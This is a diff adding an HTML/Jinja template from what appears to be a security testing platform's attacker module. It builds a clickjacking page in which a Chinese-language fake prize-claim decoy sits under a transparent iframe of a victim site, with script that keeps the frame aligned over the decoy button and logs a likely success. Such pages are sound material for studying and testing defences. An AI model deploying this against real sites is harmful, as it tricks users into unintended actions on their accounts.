@@ -1,0 +1,95 @@
+{% extends "attacker/base.html" %}
+{% block title %}{{ scenario.seq }} {{ scenario.title }}{% endblock %}
+{% block content %}
+{% include "attacker/run/_run_header.html" %}
+
+    <div class="attack-stage" id="stage">
+      <div class="decoy-card">
+        <span class="decoy-badge">🎁 限时抽奖活动</span>
+        <h2>恭喜！您已抽中今日专属大奖</h2>
+        <div class="decoy-prize">📱</div>
+        <p class="decoy-countdown">⏱ 距奖品过期 09:47</p>
+        <p>点击下方按钮立即领取，奖品数量有限，10 分钟内有效。</p>
+        <button type="button" class="decoy-button" id="decoy-button">{{ params.decoy_text }}</button>
+      </div>
+  {% set effective_opacity = 0.35 if (params.debug and params.opacity < 0.35) else params.opacity %}
+  <iframe id="victim-frame"
+          class="{{ 'debug-outline' if params.debug else '' }}"
+          title="attack target"
+          src="{{ params.victim_url() }}"
+          style="width: {{ params.iframe_width }}px; height: {{ params.iframe_height }}px; opacity: {{ effective_opacity }};"></iframe>
+</div>
+
+<script>
+  const RUN_ID = {{ run.run_id | tojson }};
+  const REPORT_TOKEN = {{ report_token | tojson }};
+  const PARAMS = {{ params.as_dict() | tojson }};
+</script>
+<script src="{{ url_for('static', filename='js/attack-report.js') }}"></script>
+<script>
+  (function () {
+    "use strict";
+    const stage = document.getElementById("stage");
+    const frame = document.getElementById("victim-frame");
+    const decoy = document.getElementById("decoy-button");
+    const statusLine = document.getElementById("run-status");
+
+    function alignFrame() {
+      const stageRect = stage.getBoundingClientRect();
+      const decoyRect = decoy.getBoundingClientRect();
+      const targetCx = decoyRect.left + decoyRect.width / 2 - stageRect.left + PARAMS.offset_x;
+      const targetCy = decoyRect.top + decoyRect.height / 2 - stageRect.top + PARAMS.offset_y;
+      frame.style.left = Math.round(targetCx - PARAMS.iframe_width / 2) + "px";
+      frame.style.top = Math.round(targetCy - PARAMS.iframe_height / 2) + "px";
+      const frameRect = frame.getBoundingClientRect();
+      return {
+        drift_x: Math.round(frameRect.left + frameRect.width / 2 - (decoyRect.left + decoyRect.width / 2)),
+        drift_y: Math.round(frameRect.top + frameRect.height / 2 - (decoyRect.top + decoyRect.height / 2))
+      };
+    }
+
+    let loadsForCurrentSrc = 0;
+    let finished = false;
+
+    frame.addEventListener("load", function () {
+      loadsForCurrentSrc += 1;
+      AttackReport.reportEvent(RUN_ID, REPORT_TOKEN, {
+        type: "iframe_load",
+        sequence: loadsForCurrentSrc
+      });
+      if (loadsForCurrentSrc >= 2 && !finished) {
+        finished = true;
+        AttackReport.reportEvent(RUN_ID, REPORT_TOKEN, {
+          type: "victim_action_reload",
+          sequence: loadsForCurrentSrc
+        });
+        AttackReport.reportEvent(RUN_ID, REPORT_TOKEN, {
+          type: "run_complete",
+          outcome: "likely_success"
+        });
+        statusLine.textContent =
+          "目标页面在 iframe 内发生了提交后跳转：敏感操作很可能已被触发，请用 victim 测试 API 核实业务状态变化。";
+      }
+    });
+
+    window.addEventListener("DOMContentLoaded", function () {
+      const drift = alignFrame();
+      AttackReport.reportEvent(RUN_ID, REPORT_TOKEN, { type: "align", drift_x: drift.drift_x, drift_y: drift.drift_y });
+      AttackReport.reportEvent(RUN_ID, REPORT_TOKEN, { type: "page_ready" });
+      statusLine.textContent = "对齐完成，等待诱导点击落入透明 iframe。";
+    });
+    window.addEventListener("resize", function () {
+      alignFrame();
+    });
+
+// 布局稳定前按钮位置可能变化（字体渲染/内容加载/滚动条出现），
+// 在所有布局变化点重复对齐，幂等且开销极低。
+window.addEventListener("load", alignFrame);
+window.addEventListener("scroll", alignFrame, { passive: true });
+if (document.fonts && document.fonts.ready) {
+  document.fonts.ready.then(function () { alignFrame(); });
+}
+[300, 800, 1500].forEach(function (ms) { setTimeout(alignFrame, ms); });
+  })();
+</script>
+{% endblock %}
